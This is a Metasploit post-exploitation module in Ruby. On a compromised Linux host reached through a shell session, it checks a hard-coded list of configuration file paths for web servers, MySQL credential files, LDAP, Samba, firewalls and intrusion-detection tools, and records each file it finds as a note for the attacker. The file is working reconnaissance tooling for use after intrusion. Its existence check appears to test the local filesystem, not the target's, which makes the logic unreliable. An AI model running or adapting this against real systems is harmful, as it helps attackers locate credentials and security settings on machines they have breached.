##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Linux Gather Configurations',
			'Description'   => %q{
				This module tries to find configuration files for commonly installed
				applications and services. We are looking for web-servers, SQL servers,
				authentication platforms, security applications and others.
				We will check the default locations for these configurations.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'ohdae <bindshell[at]live.com>',
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'linux' ],
			'SessionTypes'  => [ 'shell' ]
		))
	end

	def run
		distro = get_sysinfo
		h = get_host
		print_status("Running module against #{h}")
		print_status("Info:")
		print_status("\t#{distro[:version]}")
		print_status("\t#{distro[:kernel]}")
		
		vprint_status("Finding configuration files...")
		find_configs
	end

	def get_host
		case session.type
		when /meterpreter/
			host = sysinfo["Computer"]
		when /shell/
			host = session.shell_command_token("hostname").chomp
		end

		return host
	end

	def find_configs
		configs =["/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
			"/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
			"/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/security/access.conf", "/etc/gated.conf",
			"/etc/rpc", "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf",
			"/etc/rkhunter.conf", "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/openldap.conf", "/etc/cups/cups.conf",
			"/etc/opt/lampp/etc/httpd.conf", "/etc/sysctl.conf", "/etc/proxychains.conf", "/etc/cups/snmp.conf", "/etc/mail/sendmail.conf",
			"/etc/snmp/snmp.conf"]

		configs.each do |f|
			if ::File.exist?("#{f}") == true
				print_good("Found: #{f}")
				output = ("Config: #{f}")

				report_note(
					:host_name => get_host,
					:type      => "config files",
					:data      => output,
					:update    => :unique_data
				)
			end
		end
		print_status("Found configurations saved in notes.")
	end
end
